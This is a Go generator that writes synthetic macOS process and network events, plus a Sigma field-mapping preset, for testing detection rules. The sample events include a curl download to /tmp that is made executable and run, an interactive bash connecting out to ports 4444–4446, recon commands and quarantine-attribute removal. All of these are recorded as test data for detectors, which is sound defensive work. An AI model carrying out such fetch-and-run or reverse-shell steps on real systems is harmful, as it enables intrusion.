// Command gen writes the ZAAFElegia sample scenarios: macOS events that the
// rules in integrations/zaafelegia/rules should (and should not) match.
//
//	go run ./integrations/zaafelegia/samples/gen -ndjson integrations/zaafelegia/samples/macos-scenarios.ndjson
//	go run ./integrations/zaafelegia/samples/gen -check integrations/zaafelegia/samples/macos-scenarios.ndjson
//	go run ./integrations/zaafelegia/samples/gen -capture /tmp/scenarios.rcap
//	go run ./integrations/zaafelegia/samples/gen -pipeline integrations/zaafelegia/pipeline/zaafvesper.yml
//
// -ndjson writes the records with the real encoder (schema
// zaafvesper.elegia/1, Computer mac-01); -check fails when the committed file
// is out of date; -capture writes the same events as a ZAAFVesper capture,
// so CI can run them through `zaafvesper replay --elegia-dir`.
package main

import (
	"bytes"
	"flag"
	"fmt"
	"os"
	"sort"
	"strings"
	"time"

	"github.com/rifqifitriady/ZAAFVesper/pkg/capture"
	"github.com/rifqifitriady/ZAAFVesper/pkg/event"
	"github.com/rifqifitriady/ZAAFVesper/pkg/output"
	"github.com/rifqifitriady/ZAAFVesper/pkg/sigmamap"
)

// Host is the Computer of every sample record.
const Host = "mac-01"

var t0 = time.Date(2026, 11, 9, 9, 0, 0, 0, time.UTC)

func proc(pid int32, uniq uint64, exe, cmd, user string, parent *event.Proc) *event.Proc {
	p := &event.Proc{PID: pid, PIDVersion: uint32(pid), UniqueID: uniq, Exe: exe, Name: base(exe), Cmdline: cmd,
		Username: user, UID: 501, EUID: 501, IsPlatform: true, IsSigned: true, CSCategory: event.CSPlatform,
		SigningID: "com.apple." + base(exe), Parent: parent}
	if parent != nil {
		p.PPID = parent.PID
	}
	return p
}

func base(p string) string {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '/' {
			return p[i+1:]
		}
	}
	return p
}

// scenarios returns the events in time order.
func scenarios() []*event.Event {
	var evs []*event.Event
	seq := uint64(1)
	add := func(at time.Duration, e *event.Event) {
		e.Seq, e.Time, e.Platform = seq, t0.Add(at), event.PlatformMacOS
		if e.Source == "" {
			e.Source = "eslogger"
		}
		seq++
		evs = append(evs, e)
	}
	exec := func(at time.Duration, p *event.Proc) { add(at, &event.Event{Name: event.CreateProcess, Proc: p}) }
	zsh := proc(800, 8800, "/bin/zsh", "-zsh", "rifqi", nil)

	// 1. Download, chmod +x in /tmp, execute (correlation: temporal_ordered).
	exec(0, proc(801, 8801, "/usr/bin/curl", "curl -fsSL http://198.51.100.23/stage -o /tmp/stage", "rifqi", zsh))
	exec(5*time.Second, proc(802, 8802, "/bin/chmod", "chmod +x /tmp/stage", "rifqi", zsh))
	stage := proc(803, 8803, "/private/tmp/stage", "/tmp/stage", "rifqi", zsh)
	stage.IsPlatform, stage.IsSigned, stage.CSCategory, stage.SigningID = false, false, "", ""
	exec(8*time.Second, stage)

	// 2. Discovery burst from one script (correlation: temporal, 1 minute).
	sh := proc(900, 9900, "/bin/sh", "sh /tmp/recon.sh", "rifqi", zsh)
	exec(60*time.Second, proc(901, 9901, "/usr/sbin/system_profiler", "system_profiler SPHardwareDataType", "rifqi", sh))
	exec(62*time.Second, proc(902, 9902, "/usr/bin/sw_vers", "sw_vers", "rifqi", sh))
	exec(64*time.Second, proc(903, 9903, "/usr/sbin/ioreg", "ioreg -l", "rifqi", sh))
	exec(66*time.Second, proc(904, 9904, "/usr/bin/csrutil", "csrutil status", "rifqi", sh))

	// 3. One shell connecting to several remote ports (correlation:
	// value_count of DestinationPort per process).
	bash := proc(950, 9950, "/bin/bash", "bash -i", "rifqi", zsh)
	for i, port := range []uint16{4444, 4445, 4446} {
		add(time.Duration(120+i*10)*time.Second, &event.Event{Name: event.NetworkConnect, Source: "netpoll", Proc: bash,
			Net: &event.Net{Proto: "tcp", Direction: "outbound", SrcIP: "192.168.1.20", SrcPort: uint16(50100 + i), DstIP: "203.0.113.9", DstPort: port}})
	}

	// 4. Quarantine stripped from five files in two minutes (correlation:
	// event_count per user).
	for i := 0; i < 5; i++ {
		exec(time.Duration(200+i*20)*time.Second, proc(int32(1000+i), uint64(11000+i), "/usr/bin/xattr",
			fmt.Sprintf("xattr -d com.apple.quarantine /Users/rifqi/Downloads/app%d.dmg", i), "rifqi", zsh))
	}

	// Benign lookalikes: an HTTPS download that is never made executable,
	// a single quarantine removal by another user, and one connection from
	// another shell.
	exec(400*time.Second, proc(1100, 12100, "/usr/bin/curl", "curl -fsSLO https://example.org/notes.pdf", "dana", nil))
	exec(410*time.Second, proc(1101, 12101, "/usr/bin/xattr", "xattr -d com.apple.quarantine /Users/dana/Downloads/notes.pdf", "dana", nil))
	other := proc(1102, 12102, "/bin/zsh", "zsh", "dana", nil)
	add(420*time.Second, &event.Event{Name: event.NetworkConnect, Source: "netpoll", Proc: other,
		Net: &event.Net{Proto: "tcp", Direction: "outbound", SrcIP: "192.168.1.30", SrcPort: 50300, DstIP: "203.0.113.50", DstPort: 22}})
	return evs
}

func ndjson() ([]byte, error) {
	var b bytes.Buffer
	for _, e := range scenarios() {
		line, err := output.EncodeSigma(e, output.SigmaOptions{DefaultProduct: event.PlatformMacOS, Host: Host}, 0)
		if err != nil {
			return nil, err
		}
		b.Write(line)
		b.WriteByte('\n')
	}
	return b.Bytes(), nil
}

// pipelineHead and pipelineTail surround the generated identity mapping.
const pipelineHead = `# ZAAFElegia pipeline preset for ZAAFVesper events (schema zaafvesper.elegia/1,
# written by ` + "`zaafvesper run|replay --elegia-out`" + ` and ` + "`--elegia-dir`" + `).
# Generated by integrations/zaafelegia/samples/gen -pipeline; do not edit by hand.
#
# ZAAFVesper already writes Sigma field names, so the first mapping is the
# identity: it declares every Sigma field ZAAFVesper emits (from
# pkg/sigmamap), so ZAAFElegia does not warn that they are "not mapped". The
# next mappings add, on macOS only:
#   1. Process keys for correlation. macOS has no ProcessGuid; the kernel's
#      per-boot unique process id plays that role. The one-to-many mapping
#      keeps a real ProcessGuid first.
#   2. Names for ZAAFVesper's macOS code-signing identity, which Sigma's
#      taxonomy has no fields for.
# Usage: zaaf hunt -p zaafvesper.yml -r <rules> events/*.ndjson
name: zaafvesper
priority: 20
transformations:
  - type: field_name_mapping
    mapping:
`

const pipelineTail = `    rule_conditions:
      - product: macos
      - product: windows
      - product: linux
  - type: field_name_mapping
    mapping:
      ProcessGuid: [ProcessGuid, zaafvesper.proc.unique_id]
      ParentProcessGuid: [ParentProcessGuid, zaafvesper.parent.unique_id]
      SigningId: zaafvesper.proc.signing_id
      TeamId: zaafvesper.proc.team_id
      SigningCategory: zaafvesper.proc.cs_category
      PlatformBinary: zaafvesper.proc.is_platform
      Signed: zaafvesper.proc.is_signed
      ParentSigningId: zaafvesper.parent.signing_id
      ParentPlatformBinary: zaafvesper.parent.is_platform
      IdentityUnverified: zaafvesper.identity
      ZaafEventName: zaafvesper.name
    rule_conditions:
      - product: macos
`

// pipeline returns the preset: an identity mapping of every Sigma field
// ZAAFVesper writes (all categories of pkg/sigmamap plus the fields the
// encoder adds), then the macOS mappings.
func pipeline() []byte {
	set := map[string]bool{"EventID": true, "UtcTime": true, "Computer": true}
	for _, c := range sigmamap.Categories {
		for _, sf := range sigmamap.ExportFields(c.Name) {
			set[sf] = true
		}
		for sf := range c.Values {
			set[sf] = true
		}
	}
	names := make([]string, 0, len(set))
	for n := range set {
		names = append(names, n)
	}
	sort.Strings(names)
	var b strings.Builder
	b.WriteString(pipelineHead)
	for _, n := range names {
		fmt.Fprintf(&b, "      %s: %s\n", n, n)
	}
	b.WriteString(pipelineTail)
	return []byte(b.String())
}

func main() {
	out := flag.String("ndjson", "", "write the sample records to this file")
	check := flag.String("check", "", "fail when this committed sample file differs from what gen writes")
	capPath := flag.String("capture", "", "write the scenarios as a new ZAAFVesper capture (.rcap)")
	pipe := flag.String("pipeline", "", "write the zaafvesper pipeline preset to this file")
	checkPipe := flag.String("check-pipeline", "", "fail when this committed preset differs from what gen writes")
	flag.Parse()
	b, err := ndjson()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	switch {
	case *pipe != "":
		err = os.WriteFile(*pipe, pipeline(), 0o644)
	case *checkPipe != "":
		var got []byte
		if got, err = os.ReadFile(*checkPipe); err == nil && !bytes.Equal(got, pipeline()) {
			err = fmt.Errorf("%s is out of date: run go run ./integrations/zaafelegia/samples/gen -pipeline %s", *checkPipe, *checkPipe)
		}
	case *out != "":
		err = os.WriteFile(*out, b, 0o644)
	case *check != "":
		var got []byte
		if got, err = os.ReadFile(*check); err == nil && !bytes.Equal(got, b) {
			err = fmt.Errorf("%s is out of date: run go run ./integrations/zaafelegia/samples/gen -ndjson %s", *check, *check)
		}
	case *capPath != "":
		var w *capture.Writer
		if w, err = capture.Create(*capPath); err == nil {
			for _, e := range scenarios() {
				if err = w.Write(e); err != nil {
					break
				}
			}
			if cerr := w.Close(); err == nil {
				err = cerr
			}
		}
	default:
		_, err = os.Stdout.Write(b)
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
